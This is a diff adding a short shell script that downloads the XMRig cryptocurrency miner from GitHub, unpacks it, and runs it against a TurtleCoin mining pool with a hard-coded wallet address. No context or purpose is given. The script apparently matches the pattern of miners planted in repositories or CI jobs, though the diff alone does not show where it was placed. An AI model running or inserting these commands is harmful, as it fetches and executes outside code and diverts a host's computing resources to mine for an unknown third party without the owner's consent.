@@ -1,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-bionic-x64.tar.gz
+tar xf xmrig-6.15.1-bionic-x64.tar.gz
+cd xmrig-6.15.1
+./xmrig --donate-level 1 -o trtl-miner.azpool.win:3333 -u TRTLuzmYtF17c1cLmwyUcsegynf7EpcV4NN1qQktpV9GQXwzXEZQVAwSMzgcrDmnkdBZgnbFSPwRa1RXHh9d1PSTapighKVQ3e8 -p coke -a argon2/chukwav2 -k 
